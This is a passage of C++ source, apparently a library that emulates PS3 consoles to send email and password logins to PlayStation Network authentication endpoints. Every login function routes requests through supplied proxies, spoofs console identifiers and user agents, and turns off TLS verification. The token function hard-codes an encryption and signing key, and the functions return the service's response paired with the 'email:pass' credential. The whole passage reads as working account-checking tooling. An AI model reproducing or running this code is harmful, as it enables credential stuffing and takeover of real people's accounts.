				"%s%s%s%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),
				combine.c_str(), contentstring.c_str(), combine.c_str(), credential.c_str(), combine.c_str(),
				res);


			curl_global_cleanup();

			//2021.03.31
// 			if (FRAMEWORK != NULL)
// 				free(FRAMEWORK);

			if (res != CURLE_OK)
			{

				return (char*)"UNKNOWN ERROR";
			}
			return strres;
		}
		else
		{
			return (char*)"UNKNOWN ERROR";
		}
	}
	catch (...)
	{
		return (char*)"UNKNOWN ERROR";
	}
}


char* kdpMethod(char* e, char* p, char* c, char* px, int pxt)
{
	/* 2021.03.31-----update
	int state = 0;
	char* gStrResult = new char[8192];
	return authConfig(e, p, c, px, pxt, gStrResult, &state);

	return NULL;
	*/
	return kdpConfig(e, p, c, px, pxt);
}


char* cdpConfig(char* e, char* p, char* c, char* px, int pxt) 
{
	try
	{
		//mut.lock();
		string email(e);
		string pass(p);
		string console(c);
		string proxy(px);
		int proxytype(pxt);



		string par = "loginid=" + email + "&password=" + pass + "&consoleId=" + console + "&productid=UP9000-NPUC97142_00-0000000000000000";
		curl_global_init(CURL_GLOBAL_ALL);
		CURLcode res;
		struct curl_slist* chunk = NULL;
		curl_global_init(CURL_GLOBAL_ALL);
		auto curl = curl_easy_init();
		std::string readBuffer, response_string = "", header_string = "";


		curl_easy_reset(curl);

		if (curl) {

			char content_length[40];
			sprintf_s(content_length, "Content-Length: %d", (int)strlen(par.c_str()));
			std::string s = "";


			chunk = NULL;

			chunk = curl_slist_append(chunk, "Host: commerce.np.ac.playstation.net");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, content_length);
			chunk = curl_slist_append(chunk, "Accept-Encoding: identity");
			chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			chunk = curl_slist_append(chunk, "User-Agent: Legium pro Britania");
			chunk = curl_slist_append(chunk, "X-I-5-DRM-Version: 1.0");



			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());
			



			curl_easy_setopt(curl, CURLOPT_URL, "https://commerce.np.ac.playstation.net/cdp.m");
			vector<string> strings;
			istringstream f(proxy);
			string teps;
			while (getline(f, teps, ':')) {
				strings.push_back(teps);
			}

			if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			{



				char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
				sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
				curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			}
			else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			{
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			}

			if (strings.size() > 0)
				strings.~vector();

			curl_easy_setopt(curl, CURLOPT_USERAGENT, "PS3Application libhttp/4.8.7-000 (CellOS)");

			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);
			//char nline[5000];


			res = curl_easy_perform(curl);

			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);

			curl = curl_easy_init();

			string combine = "______________________";
			string contentstring = header_string + response_string;
			string credential = email + ":" + pass;
			string resultstring = header_string + combine + response_string + combine + contentstring + combine + credential + combine;

			auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 11));



			sprintf_s(strres,
				header_string.length() + combine.length() + response_string.length() + combine.length() +
				contentstring.length() + combine.length() + credential.length() + combine.length() + 4,
				"%s%s%s%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),
				combine.c_str(), contentstring.c_str(), combine.c_str(), credential.c_str(), combine.c_str(),
				res);


			curl_global_cleanup();

			//2021.03.31
// 			if (FRAMEWORK != NULL)
// 				free(FRAMEWORK);

			if (res != CURLE_OK)
			{

				return (char*)"UNKNOWN ERROR";
			}
			return strres;
		}
		else
		{
			return (char*)"UNKNOWN ERROR";
		}
	}
	catch (...)
	{
		return (char*)"UNKNOWN ERROR";
	}
}


char* cdpMethod(char* e, char* p, char* c, char* px, int pxt)
{
	/* 2021.03.31-----update
	int state = 0;
	char* gStrResult = new char[8192];
	return authConfig(e, p, c, px, pxt, gStrResult, &state);

	return NULL;
	*/
	return cdpConfig(e, p, c, px, pxt);
}

char* authConfig(char* e, char* p, char* c, char* px, int pxt)
{
	try
	{
		//mut.lock();
		string email(e);
		string pass(p);
		string console(c);
		string proxy(px);
		int proxytype(pxt);



		string par = "version=25&username=" + email + "&password=" + pass + "&consoleId=" + console + "&serviceEntity=urn:service-entity:psn2";
		curl_global_init(CURL_GLOBAL_ALL);
		CURLcode res;
		struct curl_slist* chunk = NULL;
		curl_global_init(CURL_GLOBAL_ALL);
		auto curl = curl_easy_init();
		std::string readBuffer, response_string = "", header_string = "";


		curl_easy_reset(curl);

		if (curl) {
			srand(time(NULL));

			struct NPpp_FRAMEWORK* FRAMEWORK = (NPpp_FRAMEWORK*)malloc(sizeof(struct NPpp_FRAMEWORK));
			generate_unique_framework(FRAMEWORK);
			uint64_t outlen;

			uint8_t npid_ascii[0x10] = { '1','1','1','B','F','C','4','8','1','7','9','3','A','9','2','4' };
			uint8_t idps[0x10];

			choose_rand_idps(idps, ps3_ids);



			//char post[50000];

			//sprintf_s(post, par.c_str());

			char content_length[40];
			sprintf_s(content_length, "Content-Length: %d", strlen(par.c_str()));
			std::string s = "";


			chunk = NULL;

			chunk = curl_slist_append(chunk, "Host: native-ps3.np.ac.playstation.net");
			chunk = curl_slist_append(chunk, "User-Agent: PS3Application libhttp/4.8.7-000 (CellOS)");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, content_length);
			chunk = curl_slist_append(chunk, "Accept-Encoding: gzip");
			chunk = curl_slist_append(chunk, "Content-Type: application/x-www-form-urlencoded");
			chunk = curl_slist_append(chunk, "Authorization: Basic ZmluYWw6TXJEOUt1VFE=");
			chunk = curl_slist_append(chunk, "X-MediaInformation: PS3/1920x1080");
			chunk = curl_slist_append(chunk, "Accept-Language: ja, en, fr, es, de, it, nl, pt, ru, ko, zh, ch, fi, sv, da, no, pl, tr");
			chunk = curl_slist_append(chunk, "Accept:");


			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, par.c_str());
			curl_easy_setopt(curl, CURLOPT_CAINFO, "C:\\psn_funk_lib\\Certificates\\DNASRoot05.cer");
			curl_easy_setopt(curl, CURLOPT_CAPATH, "C:\\psn_funk_lib\\Certificates\\DNASRoot05.cer");



			curl_easy_setopt(curl, CURLOPT_URL, "https://native-ps3.np.ac.playstation.net/native/cam/authenticate.action");
			vector<string> strings;
			istringstream f(proxy);
			string teps;
			while (getline(f, teps, ':')) {
				strings.push_back(teps);
			}

			if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			{



				char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
				sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
				curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			}
			else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			{
				char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
				sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

				curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
				curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
				curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			}

			if (strings.size() > 0)
				strings.~vector();

			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Lediatio Lunto Ritna");

			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);
			//char nline[5000];
			//res = curl_easy_setopt(curl, CURLOPT_COOKIELIST, nline);

			res = curl_easy_perform(curl);

			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);

			//	curl = curl_easy_init();
				/*	uint64_t outlen2;
					char* decodeast = base64_encode((const unsigned char*)response_string.c_str(), response_string.length(), &outlen2);

					response_string = decodeast;*/

			string combine = "______________________";
			string contentstring = header_string + response_string;
			string credential = email + ":" + pass;
			string resultstring = header_string + combine + response_string + combine + contentstring + combine + credential + combine;

			auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 11));



			sprintf_s(strres,
				header_string.length() + combine.length() + response_string.length() + combine.length() +
				contentstring.length() + combine.length() + credential.length() + combine.length() + 4,
				"%s%s%s%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),
				combine.c_str(), contentstring.c_str(), combine.c_str(), credential.c_str(), combine.c_str(),
				res);


			curl_global_cleanup();
			// 			if (FRAMEWORK != NULL)
			// 						free(FRAMEWORK);
			if (res != CURLE_OK)
			{

				return (char*)"UNKNOWN ERROR";
			}
			/*curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);*/
			return strres;
		}
		else
		{
			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);
			return (char*)"UNKNOWN ERROR";
		}
	
	}
	catch (...)
	{

		curl_global_cleanup();
		return (char*)"UNKNOWN ERROR";
	}
}


char* authMethod(char* e, char* p, char* c, char* px, int pxt)
{
	/* 2021.03.31-----update
	int state = 0;
	char* gStrResult = new char[8192];
	return authConfig(e, p, c, px, pxt, gStrResult, &state);

	return NULL;
	*/
	return authConfig(e, p, c, px, pxt);
}


void removeCharsFromString(string& str, char* charsToRemove) {
	for (unsigned int i = 0; i < strlen(charsToRemove); ++i) {
		str.erase(remove(str.begin(), str.end(), charsToRemove[i]), str.end());
	}
}

//Ticket Method
char* GetToken(char* navParam, char* px, int pxt)
{
	try
	{
		string navResponse(navParam);

		string proxy(px);
		int proxytype(pxt);




		  //////////////////////
		uint8_t iv[0x10];
		_fill_rand_bytes(iv, 0x10);
		long epoch = time(NULL);
		//long epoch = "1611392307";
		char sig_buf[100] = { 0 };
		char id[128] = { 0 };
		char output[0x11];
		uint8_t somedata[0x20] = { 0x33, 0x63, 0x39, 0x34, 0x37, 0x31, 0x36, 0x37, 0x34, 0x38, 0x63, 0x35, 0x38, 0x32, 0x61, 0x28, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10 };
		uint8_t key_token[0x20] = { 0x6E,0xF9,0xF3,0x36,0xFC,0x8D,0xC1,0x99,0xFA,0xE2,0x41,0x8C,0xB0,0x92,0x58,0xD6,0x05,0xE3,0x77,0x63,0x0C,0x10,0x92,0x26,0x1D,0xE0,0x5A,0xCF,0x18,0xFA,0x44,0x4E };
		//randstring2(0x10,output);
		//memcpy(somedata,output,0x10);
		aescbc256_encrypt(key_token, iv, somedata, (unsigned char*)id, sizeof(somedata));
		size_t outlen;
		size_t outlen2;
		size_t outlen3;
		

		
		
		char* id_encoded = base64_encode((unsigned char*)id, 32, &outlen);
		char* iv_encoded = base64_encode((unsigned char*)iv, 16, &outlen2);

		string iv_Encoded(iv_encoded);
		string id_Encoded(id_encoded);
	

		std::string LastChariv = iv_Encoded.substr(iv_Encoded.length() - 1, 1);

		if (LastChariv != "=")
		{
			iv_Encoded = iv_Encoded.substr(0, iv_Encoded.size() - 1);
		}

		std::string LastCharid = id_Encoded.substr(id_Encoded.length() - 1, 1);

		if (LastCharid != "=")
		{
			id_Encoded = id_Encoded.substr(0, id_Encoded.size() - 1);
		}
		


		sprintf(sig_buf, "%s.4.087.000.6.%lld", id_encoded, epoch);
		uint8_t key_hmac_token[0x40] = { 0x6E,0xF9,0xF3,0x36,0xFC,0x8D,0xC1,0x99,0xFA,0xE2,0x41,0x8C,0xB0,0x92,0x58,0xD6,0x05,0xE3,0x77,0x63,0x0C,0x10,0x92,0x26,0x1D,0xE0,0x5A,0xCF,0x18,0xFA,0x44,0x4E };
		unsigned char* result = HMAC(EVP_sha256(), key_hmac_token, 0x20, (unsigned char*)sig_buf, strlen(sig_buf), NULL, NULL);
	

		char* signature = base64_encode((unsigned char*)result, 32, &outlen3);

		string Signature(signature);
		
		std::string LastCharSignature = Signature.substr(Signature.length() - 1, 1);

		if (LastCharSignature != "=")
		{
			Signature = Signature.substr(0, Signature.size() - 1);
		}
		
	
		
	
		curl_global_init(CURL_GLOBAL_ALL);
		CURLcode res;
		struct curl_slist* chunk = NULL;
		curl_global_init(CURL_GLOBAL_ALL);
		auto curl = curl_easy_init();
		std::string readBuffer, response_string = "", header_string = "";

		curl_easy_reset(curl);

		if (curl) {
			srand(time(NULL));




			char post[50000];
			
			sprintf(post, "{\"ticket\":\"%s\",\"id\":\"%s\",\"iv\":\"%s\",\"sv\":\"4.087.000\",\"at\":6,\"si\":\"02\",\"requestTimestamp\":%lld,\"signature\":\"%s\"}"
				, navResponse.c_str(), id_Encoded.c_str(), iv_Encoded.c_str(), epoch, Signature.c_str());
			//sprintf_s(post, par.c_str());

			cout << post;
			
			char content_length[4000];
			//sprintf_s(content_length, "Content-Length: %d", par.length());
			sprintf(content_length, "Content-Length: %d", strlen(post));


			chunk = NULL;

			chunk = curl_slist_append(chunk, "Host: csla.np.community.playstation.net");
			chunk = curl_slist_append(chunk, "Connection: Keep-Alive");
			chunk = curl_slist_append(chunk, content_length);
			chunk = curl_slist_append(chunk, "User-Agent: NpCsla/4.87");
			chunk = curl_slist_append(chunk, "Content-Type: application/json");
			chunk = curl_slist_append(chunk, "Accept-Encoding: identity");
			chunk = curl_slist_append(chunk, "Accept:");


			curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
			curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post);
			/*curl_easy_setopt(curl, CURLOPT_CAINFO, "C:\\psn_funk_lib\\Certificates\\complaystation.net.cer");
			curl_easy_setopt(curl, CURLOPT_CAPATH, "C:\\psn_funk_lib\\Certificates\\complaystation.net.cer");*/


			curl_easy_setopt(curl, CURLOPT_URL, "https://csla.np.community.playstation.net/csla/v1/console/lwConsoleToken");

			//vector<string> strings;
			//istringstream f(proxy);
			//string teps;
			//while (getline(f, teps, ':')) {
			//	strings.push_back(teps);
			//}

			//if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 4)
			//{



			//	char* userpwd = (char*)malloc(strings[2].length() + strings[3].length() + 3);
			//	char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);

			//	sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());
			//	sprintf_s(userpwd, strings[2].length() + strings[3].length() + 2, "%s:%s", strings[2].c_str(), strings[3].c_str());

			//	curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
			//	curl_easy_setopt(curl, CURLOPT_PROXYUSERNAME, strings[2].c_str());
			//	curl_easy_setopt(curl, CURLOPT_PROXYPASSWORD, strings[3].c_str());
			//	curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
			//	curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);
			//	curl_easy_setopt(curl, CURLOPT_PROXYAUTH, CURLAUTH_BASIC);


			//}
			//else if (proxy.compare("") != 0 && proxy.compare(" ") != 0 && strings.size() == 2)
			//{
			//	char* proxyaddr = (char*)malloc(strings[0].length() + strings[1].length() + 3);
			//	sprintf_s(proxyaddr, strings[0].length() + strings[1].length() + 2, "%s:%s", strings[0].c_str(), strings[1].c_str());

			//	curl_easy_setopt(curl, CURLOPT_PROXY, proxyaddr);//proxyip
			//	curl_easy_setopt(curl, CURLOPT_PROXYTYPE, proxytype);//type
			//	curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1);


			//}

			//if (strings.size() > 0)
			//	strings.~vector();
			
		



			/*curl_easy_setopt(curl, CURLOPT_USERAGENT, "NpCsla/4.87");*/

			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, TRUE);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
			curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_0);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

			curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, CurlWrite_CallbackFunc_StdString);
			curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);

			curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_ALPN, 0L);
			curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
			curl_easy_setopt(curl, CURLOPT_SSL_ENABLE_NPN, 0L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

			curl_easy_setopt(curl, CURLOPT_SSL_CTX_FUNCTION, sslctxfun);
			//char nline[5000];
			//res = curl_easy_setopt(curl, CURLOPT_COOKIELIST, nline);

			res = curl_easy_perform(curl);

			curl_easy_reset(curl);

			curl_easy_cleanup(curl);
			curl_slist_free_all(chunk);

			curl = curl_easy_init();


			string combine = "______________________";
			string contentstring = header_string + response_string;
			string credential = "email";
			string resultstring = header_string + combine + response_string + combine + contentstring + combine + credential + combine;

			auto strres = (char*)malloc(sizeof(char) * (resultstring.length() + 11));



			sprintf_s(strres,
				header_string.length() + combine.length() + response_string.length() + combine.length() +
				contentstring.length() + combine.length() + credential.length() + combine.length() + 4,
				"%s%s%s%s%s%s%s%s%d", header_string.c_str(), combine.c_str(), response_string.c_str(),
				combine.c_str(), contentstring.c_str(), combine.c_str(), credential.c_str(), combine.c_str(),
				res);


			curl_global_cleanup();
			
		
			if (res != CURLE_OK)
			{
				return (char*)"UNKNOWN ERROR";
			}
			return strres;
		}
		else
		{
			return (char*)"UNKNOWN ERROR";
		}
	}
	catch (...)
	{
		return (char*)"UNKNOWN ERROR";
	}
}

char* MethodGetToken(char* navResponse, char* px, int pxt)
{
	//2021.03.31----update
	//auto fut = ansyc(thmainpsnfunk, e,p,c,px,pxt);
	//int state = 0;
	//char* gStrResult = new char[8192];
	//return GetToken(navResponse, gStrResult, &state);
	//2021.03.31----update
	return GetToken(navResponse,px,pxt);
	
	
	
	//thread tthread = thread(mainpsnfunk, e, p, c, px, pxt, gStrResult,&state, fctPointer);
	//tthread.join();

	//while (!state);

}


namespace DllPsnFunk
{


	CURLcode fn_sslctxfun(CURL* curl, void* sslctx, void* parm)
	{
		return sslctxfun(curl, sslctx, parm);
	}


	void fn_generate_unique_framework(NPpp_FRAMEWORK* FRAMEWORK)
	{
		generate_unique_framework(FRAMEWORK);
	}

	char* fn_generate_hwframework(char* idps_ascii, uint8_t* npid_ascii)
	{
		return generate_hwframework(idps_ascii, (uint8_t*)npid_ascii);
	}

	char* fn_base64decode(uint8_t* b64_decode_this, int decode_this_many_bytes)
	{
		// char* param1 = const_cast<char*>(b64_decode_this);

		//strcpy_s(param1, 500, (char*)b64_decode_this.c_str());
		// cout << b64_decode_this;
		return base64decode((char*)b64_decode_this, decode_this_many_bytes);
	}

	CURLcode fn_curl_global_init(long flags)
	{
		return curl_global_init(flags);
	}

	CURL* fn_curl_easy_init()
	{
		return curl_easy_init();
	}

	int fn_choose_rand_idps(uint8_t* idps, uint8_t* ps3_ids)
	{
		return choose_rand_idps(idps, ps3_ids);
	}

	struct curl_slist* fn_curl_slist_append(struct curl_slist* cslist, const char* pchcon)
	{
		return curl_slist_append(cslist, pchcon);
	}

	CURLcode fn_curl_easy_setopt(CURL* curl, CURLoption option, void* d)
	{
		return curl_easy_setopt(curl, option, d);
	}


	CURLcode fn_curl_easy_perform(CURL* curl)
	{
		return curl_easy_perform(curl);
	}

	
	char* psnfunkmain(char* email, char* pass, char* consoleid, char* proxy, int proxytype)
	{
		return tttmainpsnfunk(email, pass, consoleid, proxy, proxytype);
	}


	char* crssConfigMethod(char* email, char* pass, char* consoleid, char* proxy, int proxytype)
	{
		return crssMethod(email, pass, consoleid, proxy, proxytype);
	}

	char* crssVitaConfigMethod(char* email, char* pass, char* consoleid, char* proxy, int proxytype)
	{
		return crssVitaMethod(email, pass, consoleid, proxy, proxytype);
	}




	
	char* bindConfigMethod(char* email, char* pass, char* consoleid, char* proxy, int proxytype)
	{
		return bindMethod(email, pass, consoleid, proxy, proxytype);
	}



	char* kdpConfigMethod(char* email, char* pass, char* consoleid, char* proxy, int proxytype)
	{
		return kdpMethod(email, pass, consoleid, proxy, proxytype);
	}

	char* capConfigMethod(char* email, char* pass, char* consoleid, char* proxy, int proxytype)
	{
		return capMethod(email, pass, consoleid, proxy, proxytype);
	}

	
	char* cdpConfigMethod(char* email, char* pass, char* consoleid, char* proxy, int proxytype)
	{
		return cdpMethod(email, pass, consoleid, proxy, proxytype);
	}


	char* authConfigMethod(char* email, char* pass, char* consoleid, char* proxy, int proxytype)
	{
		return authMethod(email, pass, consoleid, proxy, proxytype);
	}
	
	char* getToken(char* navResponse, char* proxy, int proxytype)
	{
		return MethodGetToken(navResponse, proxy, proxytype);
	}

	char* regMethodConfig(char* email, char* pass, char* consoleid, char* proxy, int proxytype)
	{
		return RegMethod(email, pass, consoleid, proxy, proxytype);
	}

	char* regMethodConfig2(char* email, char* pass, char* consoleid, char* proxy, int proxytype)
	{
		return RegMethod2(email, pass, consoleid, proxy, proxytype);
	}
}